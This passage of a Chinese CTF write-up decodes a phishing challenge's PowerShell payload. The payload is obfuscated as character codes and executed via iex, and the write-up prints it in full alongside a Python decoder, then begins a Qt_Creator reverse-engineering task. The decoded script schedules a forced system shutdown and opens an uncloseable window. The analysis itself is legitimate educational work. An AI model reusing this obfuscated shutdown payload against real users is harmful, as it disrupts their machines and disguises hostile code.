+    <span class="comment"># 这是一个列表推导式，高效地完成了转换。</span>
+    <span class="comment"># chr() 函数接收一个整数，返回其对应的字符。</span>
+    decoded_chars = [<span class="built_in">chr</span>(<span class="built_in">int</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> numbers]
+    
+    <span class="comment"># 步骤 3: 将所有解码后的字符拼接成一个完整的字符串</span>
+    decoded_script = <span class="string">&quot;&quot;</span>.join(decoded_chars)
+    
+    <span class="built_in">print</span>(<span class="string">&quot;--- 解码完成 ---&quot;</span>)
+    
+    <span class="keyword">return</span> decoded_script
+
+<span class="comment"># --- 使用示例 ---</span>
+
+<span class="comment"># 1. 将您获得的完整混淆代码字符串粘贴到下面的三重引号之间</span>
+obfuscated_script = <span class="string">&quot;&quot;&quot;</span>
+<span class="string">  iex  ([CHar]36+[CHar]68+[CHar]101+[CHar]98+[CHar]117+[CHar]103+[CHar]80+[CHar]114+[CHar]101+[CHar]102+[CHar]101+[CHar]114+[CHar]101+[CHar]110+[CHar]99+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]69+[CHar]114+[CHar]114+[CHar]111+[CHar]114+[CHar]65+[CHar]99+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]80+[CHar]114+[CHar]101+[CHar]102+[CHar]101+[CHar]114+[CHar]101+[CHar]110+[CHar]99+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]86+[CHar]101+[CHar]114+[CHar]98+[CHar]111+[CHar]115+[CHar]101+[CHar]80+[CHar]114+[CHar]101+[CHar]102+[CHar]101+[CHar]114+[CHar]101+[CHar]110+[CHar]99+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]87+[CHar]97+[CHar]114+[CHar]110+[CHar]105+[CHar]110+[CHar]103+[CHar]80+[CHar]114+[CHar]101+[CHar]102+[CHar]101+[CHar]114+[CHar]101+[CHar]110+[CHar]99+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]83+[CHar]105+[CHar]108+[CHar]101+[CHar]110+[CHar]116+[CHar]108+[CHar]121+[CHar]67+[CHar]111+[CHar]110+[CHar]116+[CHar]105+[CHar]110+[CHar]117+[CHar]101+[CHar]34+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]91+[CHar]118+[CHar]111+[CHar]105+[CHar]100+[CHar]93+[CHar]32+[CHar]91+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]82+[CHar]101+[CHar]102+[CHar]108+[CHar]101+[CHar]99+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]46+[CHar]65+[CHar]115+[CHar]115+[CHar]101+[CHar]109+[CHar]98+[CHar]108+[CHar]121+[CHar]93+[CHar]58+[CHar]58+[CHar]76+[CHar]111+[CHar]97+[CHar]100+[CHar]87+[CHar]105+[CHar]116+[CHar]104+[CHar]80+[CHar]97+[CHar]114+[CHar]116+[CHar]105+[CHar]97+[CHar]108+[CHar]78+[CHar]97+[CHar]109+[CHar]101+[CHar]40+[CHar]34+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]34+[CHar]41+[CHar]13+[CHar]10+[CHar]91+[CHar]118+[CHar]111+[CHar]105+[CHar]100+[CHar]93+[CHar]32+[CHar]91+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]82+[CHar]101+[CHar]102+[CHar]108+[CHar]101+[CHar]99+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]46+[CHar]65+[CHar]115+[CHar]115+[CHar]101+[CHar]109+[CHar]98+[CHar]108+[CHar]121+[CHar]93+[CHar]58+[CHar]58+[CHar]76+[CHar]111+[CHar]97+[CHar]100+[CHar]87+[CHar]105+[CHar]116+[CHar]104+[CHar]80+[CHar]97+[CHar]114+[CHar]116+[CHar]105+[CHar]97+[CHar]108+[CHar]78+[CHar]97+[CHar]109+[CHar]101+[CHar]40+[CHar]34+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]34+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]115+[CHar]104+[CHar]117+[CHar]116+[CHar]100+[CHar]111+[CHar]119+[CHar]110+[CHar]32+[CHar]47+[CHar]115+[CHar]32+[CHar]47+[CHar]116+[CHar]32+[CHar]54+[CHar]48+[CHar]48+[CHar]32+[CHar]62+[CHar]36+[CHar]78+[CHar]117+[CHar]108+[CHar]108+[CHar]32+[CHar]50+[CHar]62+[CHar]38+[CHar]49+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]84+[CHar]101+[CHar]120+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]67+[CHar]105+[CHar]97+[CHar]108+[CHar]108+[CHar]111+[CHar]65374+[CHar]40+[CHar]8736+[CHar]183+[CHar]969+[CHar]60+[CHar]32+[CHar]41+[CHar]8978+[CHar]9733+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]83+[CHar]116+[CHar]97+[CHar]114+[CHar]116+[CHar]80+[CHar]111+[CHar]115+[CHar]105+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]77+[CHar]97+[CHar]110+[CHar]117+[CHar]97+[CHar]108+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]76+[CHar]111+[CHar]99+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]80+[CHar]111+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]52+[CHar]48+[CHar]44+[CHar]32+[CHar]52+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]40+[CHar]55+[CHar]50+[CHar]48+[CHar]44+[CHar]32+[CHar]52+[CHar]56+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]77+[CHar]105+[CHar]110+[CHar]105+[CHar]109+[CHar]97+[CHar]108+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]40+[CHar]55+[CHar]50+[CHar]48+[CHar]44+[CHar]32+[CHar]52+[CHar]56+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]77+[CHar]97+[CHar]120+[CHar]105+[CHar]109+[CHar]97+[CHar]108+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]40+[CHar]55+[CHar]50+[CHar]48+[CHar]44+[CHar]32+[CHar]52+[CHar]56+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]66+[CHar]111+[CHar]114+[CHar]100+[CHar]101+[CHar]114+[CHar]83+[CHar]116+[CHar]121+[CHar]108+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]70+[CHar]105+[CHar]120+[CHar]101+[CHar]100+[CHar]68+[CHar]105+[CHar]97+[CHar]108+[CHar]111+[CHar]103+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]66+[CHar]97+[CHar]99+[CHar]107+[CHar]67+[CHar]111+[CHar]108+[CHar]111+[CHar]114+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]35+[CHar]48+[CHar]48+[CHar]55+[CHar]55+[CHar]67+[CHar]67+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]77+[CHar]97+[CHar]120+[CHar]105+[CHar]109+[CHar]105+[CHar]122+[CHar]101+[CHar]66+[CHar]111+[CHar]120+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]70+[CHar]97+[CHar]108+[CHar]115+[CHar]101+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]84+[CHar]111+[CHar]112+[CHar]77+[CHar]111+[CHar]115+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]84+[CHar]114+[CHar]117+[CHar]101+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]102+[CHar]70+[CHar]49+[CHar]73+[CHar]65+[CHar]52+[CHar]57+[CHar]71+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]76+[CHar]73+[CHar]76+[CHar]67+[CHar]84+[CHar]70+[CHar]123+[CHar]56+[CHar]51+[CHar]95+[CHar]86+[CHar]108+[CHar]54+[CHar]108+[CHar]49+[CHar]65+[CHar]110+[CHar]84+[CHar]95+[CHar]64+[CHar]103+[CHar]52+[CHar]105+[CHar]110+[CHar]115+[CHar]84+[CHar]95+[CHar]112+[CHar]104+[CHar]108+[CHar]53+[CHar]104+[CHar]73+[CHar]78+[CHar]71+[CHar]125+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]102+[CHar]70+[CHar]49+[CHar]73+[CHar]65+[CHar]52+[CHar]57+[CHar]71+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]78+[CHar]48+[CHar]112+[CHar]101+[CHar]34+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]46+[CHar]84+[CHar]101+[CHar]120+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]58+[CHar]41+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]46+[CHar]76+[CHar]111+[CHar]99+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]80+[CHar]111+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]54+[CHar]52+[CHar]44+[CHar]32+[CHar]56+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]46+[CHar]65+[CHar]117+[CHar]116+[CHar]111+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]84+[CHar]114+[CHar]117+[CHar]101+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]101+[CHar]67+[CHar]111+[CHar]108+[CHar]111+[CHar]114+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]87+[CHar]104+[CHar]105+[CHar]116+[CHar]101+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]67+[CHar]111+[CHar]110+[CHar]115+[CHar]111+[CHar]108+[CHar]97+[CHar]115+[CHar]34+[CHar]44+[CHar]32+[CHar]54+[CHar]52+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]46+[CHar]84+[CHar]101+[CHar]120+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]36825+[CHar]37324+[CHar]27809+[CHar]26377+[CHar]32+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]65307+[CHar]36825+[CHar]20010+[CHar]31383+[CHar]21475+[CHar]26159+[CHar]24590+[CHar]20040+[CHar]20986+[CHar]29616+[CHar]30340+[CHar]21602+[CHar]65292+[CHar]102+[CHar]108+[CHar]97+[CHar]103+[CHar]32+[CHar]23601+[CHar]22312+[CHar]37027+[CHar]37324+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]46+[CHar]76+[CHar]111+[CHar]99+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]80+[CHar]111+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]54+[CHar]52+[CHar]44+[CHar]32+[CHar]50+[CHar]52+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]46+[CHar]65+[CHar]117+[CHar]116+[CHar]111+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]84+[CHar]114+[CHar]117+[CHar]101+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]101+[CHar]67+[CHar]111+[CHar]108+[CHar]111+[CHar]114+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]87+[CHar]104+[CHar]105+[CHar]116+[CHar]101+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]24494+[CHar]36719+[CHar]38597+[CHar]40657+[CHar]34+[CHar]44+[CHar]32+[CHar]49+[CHar]54+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]46+[CHar]84+[CHar]101+[CHar]120+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]20320+[CHar]30340+[CHar]30005+[CHar]33041+[CHar]23558+[CHar]22312+[CHar]32+[CHar]49+[CHar]48+[CHar]32+[CHar]20998+[CHar]38047+[CHar]21518+[CHar]20851+[CHar]26426+[CHar]65292+[CHar]35831+[CHar]20445+[CHar]23384+[CHar]20320+[CHar]30340+[CHar]24037+[CHar]20316+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]46+[CHar]76+[CHar]111+[CHar]99+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]80+[CHar]111+[CHar]105+[CHar]110+[CHar]116+[CHar]40+[CHar]54+[CHar]52+[CHar]44+[CHar]32+[CHar]51+[CHar]48+[CHar]48+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]46+[CHar]65+[CHar]117+[CHar]116+[CHar]111+[CHar]83+[CHar]105+[CHar]122+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]84+[CHar]114+[CHar]117+[CHar]101+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]101+[CHar]67+[CHar]111+[CHar]108+[CHar]111+[CHar]114+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]87+[CHar]104+[CHar]105+[CHar]116+[CHar]101+[CHar]34+[CHar]13+[CHar]10+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]32+[CHar]61+[CHar]32+[CHar]78+[CHar]101+[CHar]119+[CHar]45+[CHar]79+[CHar]98+[CHar]106+[CHar]101+[CHar]99+[CHar]116+[CHar]32+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]68+[CHar]114+[CHar]97+[CHar]119+[CHar]105+[CHar]110+[CHar]103+[CHar]46+[CHar]70+[CHar]111+[CHar]110+[CHar]116+[CHar]40+[CHar]34+[CHar]24494+[CHar]36719+[CHar]38597+[CHar]40657+[CHar]34+[CHar]44+[CHar]32+[CHar]49+[CHar]54+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]67+[CHar]111+[CHar]110+[CHar]116+[CHar]114+[CHar]111+[CHar]108+[CHar]115+[CHar]46+[CHar]65+[CHar]100+[CHar]100+[CHar]82+[CHar]97+[CHar]110+[CHar]103+[CHar]101+[CHar]40+[CHar]64+[CHar]40+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]49+[CHar]44+[CHar]32+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]50+[CHar]44+[CHar]32+[CHar]36+[CHar]76+[CHar]97+[CHar]98+[CHar]101+[CHar]108+[CHar]51+[CHar]41+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]65+[CHar]100+[CHar]100+[CHar]95+[CHar]83+[CHar]104+[CHar]111+[CHar]119+[CHar]110+[CHar]40+[CHar]123+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]65+[CHar]99+[CHar]116+[CHar]105+[CHar]118+[CHar]97+[CHar]116+[CHar]101+[CHar]40+[CHar]41+[CHar]125+[CHar]41+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]65+[CHar]100+[CHar]100+[CHar]95+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]67+[CHar]108+[CHar]111+[CHar]115+[CHar]105+[CHar]110+[CHar]103+[CHar]40+[CHar]123+[CHar]13+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]36+[CHar]95+[CHar]46+[CHar]67+[CHar]97+[CHar]110+[CHar]99+[CHar]101+[CHar]108+[CHar]32+[CHar]61+[CHar]32+[CHar]36+[CHar]84+[CHar]114+[CHar]117+[CHar]101+[CHar]13+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]91+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]77+[CHar]101+[CHar]115+[CHar]115+[CHar]97+[CHar]103+[CHar]101+[CHar]66+[CHar]111+[CHar]120+[CHar]93+[CHar]58+[CHar]58+[CHar]83+[CHar]104+[CHar]111+[CHar]119+[CHar]40+[CHar]34+[CHar]19981+[CHar]20801+[CHar]35768+[CHar]20851+[CHar]38381+[CHar]65281+[CHar]34+[CHar]44+[CHar]32+[CHar]34+[CHar]25552+[CHar]31034+[CHar]34+[CHar]44+[CHar]32+[CHar]91+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]77+[CHar]101+[CHar]115+[CHar]115+[CHar]97+[CHar]103+[CHar]101+[CHar]66+[CHar]111+[CHar]120+[CHar]66+[CHar]117+[CHar]116+[CHar]116+[CHar]111+[CHar]110+[CHar]115+[CHar]93+[CHar]58+[CHar]58+[CHar]79+[CHar]75+[CHar]44+[CHar]32+[CHar]91+[CHar]83+[CHar]121+[CHar]115+[CHar]116+[CHar]101+[CHar]109+[CHar]46+[CHar]87+[CHar]105+[CHar]110+[CHar]100+[CHar]111+[CHar]119+[CHar]115+[CHar]46+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]115+[CHar]46+[CHar]77+[CHar]101+[CHar]115+[CHar]115+[CHar]97+[CHar]103+[CHar]101+[CHar]66+[CHar]111+[CHar]120+[CHar]73+[CHar]99+[CHar]111+[CHar]110+[CHar]93+[CHar]58+[CHar]58+[CHar]73+[CHar]110+[CHar]102+[CHar]111+[CHar]114+[CHar]109+[CHar]97+[CHar]116+[CHar]105+[CHar]111+[CHar]110+[CHar]41+[CHar]13+[CHar]10+[CHar]125+[CHar]41+[CHar]13+[CHar]10+[CHar]13+[CHar]10+[CHar]36+[CHar]70+[CHar]111+[CHar]114+[CHar]109+[CHar]46+[CHar]83+[CHar]104+[CHar]111+[CHar]119+[CHar]68+[CHar]105+[CHar]97+[CHar]108+[CHar]111+[CHar]103+[CHar]40+[CHar]41+[CHar]32+[CHar]124+[CHar]32+[CHar]79+[CHar]117+[CHar]116+[CHar]45+[CHar]78+[CHar]117+[CHar]108+[CHar]108)  </span>
+<span class="string">&quot;&quot;&quot;</span>
+
+decoded_script = decode_ps_char_obfuscation(obfuscated_script)
+
+<span class="built_in">print</span>(<span class="string">&quot;\n--- 解码后的脚本内容 ---\n&quot;</span>)
+<span class="built_in">print</span>(decoded_script)</code></pre>
+
+<p>得到原始代码</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816174605287.png" alt="image-20250816174605287"></p>
+<p>得到flag</p>
+<p><strong>LILCTF{83_Vl6l1AnT_@g4insT_phl5hING}</strong></p>
+<h5 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h5><p>按照题目要求安装软件，用ida打开exe</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172118660.png" alt="image-20250816172118660"></p>
+<p>目录里面有个网站，网站刚好有关于这个软件的源码</p>
+<p>所以看了一下注册机怎么写的，发现注册成功后有一个提示</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816172205821.png" alt="image-20250816172205821"></p>
+<p>先去看看注册机的源码反编译，发现一堆字符串，尝试后发现不是，说明这个应该是一个用于生成注册码的字符串</p>
